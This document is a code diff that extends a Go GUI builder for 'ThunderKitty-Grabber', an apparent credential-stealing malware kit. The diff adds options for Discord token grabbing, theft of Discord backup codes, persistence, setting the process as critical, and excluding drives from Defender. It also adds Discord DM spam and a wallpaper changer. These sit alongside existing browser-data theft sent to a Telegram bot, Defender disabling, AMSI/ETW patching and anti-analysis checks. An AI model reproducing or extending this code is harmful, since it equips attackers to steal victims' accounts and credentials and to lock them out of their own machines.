@@ -14,20 +14,27 @@ import (
 	"fyne.io/fyne/v2/widget"
 )
 
-func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL, speakTTSMessage string, swapMouse, patchPowerShell bool) {
+func buildExecutable(telebottoken, telechatid string, enableAntiDebug, enableFakeError, enableBrowsers, hideConsole, disableFactoryReset, disableTaskManager bool, openSiteURL, speakTTSMessage string, swapMouse, patchPowerShell, enablePersistence, stealBackupCodes, setWallpaper, enableTokenGrabber bool, dmMessage string) {
 	content := fmt.Sprintf(`
 package main
 
 import (
+	"ThunderKitty-Grabber/utils/sysinfo"
 	"ThunderKitty-Grabber/utils/antidbgandvm"
+	"ThunderKitty-Grabber/utils/mutex"
 	"ThunderKitty-Grabber/utils/fakeerror"
 	"ThunderKitty-Grabber/utils/browsers"
+	"ThunderKitty-Grabber/utils/tokengrabber"
+	"ThunderKitty-Grabber/utils/criticalprocess"
 	"ThunderKitty-Grabber/utils/hideconsole"
+	"ThunderKitty-Grabber/utils/backupcodes"
 	"ThunderKitty-Grabber/utils/disablefactoryreset"
 	"ThunderKitty-Grabber/utils/taskmanager"
+	"ThunderKitty-Grabber/utils/persistence"
 	"ThunderKitty-Grabber/utils/exclude"
 	"ThunderKitty-Grabber/utils/defender"
 	"ThunderKitty-Grabber/utils/powershellpatcher"
+	"ThunderKitty-Grabber/utils/wallpaperchanger"
 	"fmt"
 	"os/exec"
 )
@@ -39,12 +46,12 @@ const (
 
 func main() {
 	if %t {
-		HideConsoleWindow.HideWindow()
+		go HideConsoleWindow.HideWindow()
 	} else {
 		fmt.Println("Console window not hidden")
 	}
  	if %t {
-		AntiDebugVMAnalysis.ThunderKitty()
+		go AntiDebugVMAnalysis.ThunderKitty()
 	} else {
 		fmt.Println("Anti-debugging and VM analysis not enabled")
 	}
@@ -54,24 +61,47 @@ func main() {
 		fmt.Println("Fake error not enabled")
 	}
 
-	Exclude.FileExtensions()
-	Defender.Disable()
+	go Exclude.ExcludeDrive()
+	go Defender.Disable()
+	go Mutex.Create()
+	go CriticalProcess.Set()
+
+	go SysInfo.Fetch()
+
 	if %t {
-		browsers.ThunderKittyGrab(telebottoken, telechatid)
+		go browsers.ThunderKittyGrab(telebottoken, telechatid)
 	} else {
 		fmt.Println("Browser info grabbing not enabled")
 	}
+	
+	if %t {
+		TokenGrabber.Run(telebottoken, telechatid, "%s")
+	} else {
+		fmt.Println("Discord token grabbing not enabled")
+	}
 
 	if %t {
-		FactoryReset.Disable()
+		go BackupCodes.Search()
+	} else {
+		fmt.Println("Discord backup code recovery disabled")
+	}
+
+	if %t {
+		go FactoryReset.Disable()
 	} else {
 		fmt.Println("Factory reset not disabled")
 	}
 
 	if %t {
-		TaskManager.Disable()
+		go TaskManager.Disable()
 	} else {
 		fmt.Println("Task manager not disabled")
+	}
+
+	if %t {
+		Persistence.Create()
+	} else {
+		fmt.Println("Persistence not enabled")
 	}
 	
 	url := "%s"
@@ -95,12 +125,18 @@ func main() {
 	}
 
 	if %t {
-		PowerShellPatcher.Patch()
+		go PowerShellPatcher.Patch()
 	} else {
 		fmt.Println("PowerShell patcher not enabled")
 	}
+
+	if %t {
+		WallpaperChanger.DownloadAndSetWallpaper()
+	} else {
+		fmt.Println("Wallpaper changer not enabled")
+	}
 }
-`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, disableFactoryReset, disableTaskManager, openSiteURL, speakTTSMessage, swapMouse, patchPowerShell)
+`, telebottoken, telechatid, hideConsole, enableAntiDebug, enableFakeError, enableBrowsers, enableTokenGrabber, dmMessage, stealBackupCodes, disableFactoryReset, disableTaskManager, enablePersistence, openSiteURL, speakTTSMessage, swapMouse, patchPowerShell, setWallpaper)
 
 	file, err := os.Create("main.go")
 	if err != nil {
@@ -168,10 +204,13 @@ func main() {
 	enableAntiDebug := widget.NewCheck("Enable Anti-Debugging", nil)
 	enableFakeError := widget.NewCheck("Enable Fake Error", nil)
 	enableBrowsers := widget.NewCheck("Enable Browser Info Grabbing", nil)
+	enableTokenGrabber := widget.NewCheck("Enable Token Grabbing", nil)
+	stealBackupCodes := widget.NewCheck("Steal Discord Backup Codes", nil)
 	hideConsole := widget.NewCheck("Hide Console Window", nil)
 	disableFactoryReset := widget.NewCheck("Disable Factory Reset", nil)
 	disableTaskManager := widget.NewCheck("Disable Task Manager", nil)
 	patchPowershell := widget.NewCheck("Patch PowerShell (AMSI & ETW)", nil)
+	enablePersistence := widget.NewCheck("Enable Persistence", nil)
 
 	// Trollware Widgets
 	openSiteEntry := widget.NewEntry()
@@ -179,6 +218,9 @@ func main() {
 	speakTTSEntry := widget.NewEntry()
 	speakTTSEntry.SetPlaceHolder("Text-to-speech Message (leave blank for none)")
 	enableSwapMouse := widget.NewCheck("Swap Mouse Buttons", nil)
+	setWallpaper := widget.NewCheck("Enable Wallpaper Changer", nil)
+	sendDMMessage := widget.NewEntry()
+	sendDMMessage.SetPlaceHolder("Spam Discord Messages (leave blank for none)")
 
 	// File Pumper Widgets
 	filePumperEntry := widget.NewEntry()
@@ -195,8 +237,9 @@ func main() {
 		telechatid := telegramChatIdEntry.Text
 		openSiteURL := openSiteEntry.Text
 		speakTTSMessage := speakTTSEntry.Text
+		dmMessage := sendDMMessage.Text
 		filePumperSize := filePumperEntry.Text
-		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL, speakTTSMessage, enableSwapMouse.Checked, patchPowershell.Checked)
+		buildExecutable(telebottoken, telechatid, enableAntiDebug.Checked, enableFakeError.Checked, enableBrowsers.Checked, hideConsole.Checked, disableFactoryReset.Checked, disableTaskManager.Checked, openSiteURL, speakTTSMessage, enableSwapMouse.Checked, patchPowershell.Checked, enablePersistence.Checked, stealBackupCodes.Checked, setWallpaper.Checked, enableTokenGrabber.Checked, dmMessage)
 
 		// Pumper
 		if filePumperSize != "" {
@@ -204,7 +247,7 @@ func main() {
 			if err != nil {
 				panic(err)
 			}
-			
+
 			pumpExecutable("main.exe", pumpSize)
 		}
 	})
@@ -216,10 +259,13 @@ func main() {
 		enableAntiDebug,
 		enableFakeError,
 		enableBrowsers,
+		enableTokenGrabber,
+		stealBackupCodes,
 		hideConsole,
 		disableFactoryReset,
 		disableTaskManager,
 		patchPowershell,
+		enablePersistence,
 		buildButton,
 	)
 
@@ -228,6 +274,8 @@ func main() {
 		openSiteEntry,
 		speakTTSEntry,
 		enableSwapMouse,
+		setWallpaper,
+		sendDMMessage,
 	)
 
 	filePumperSettings := container.NewVBox(
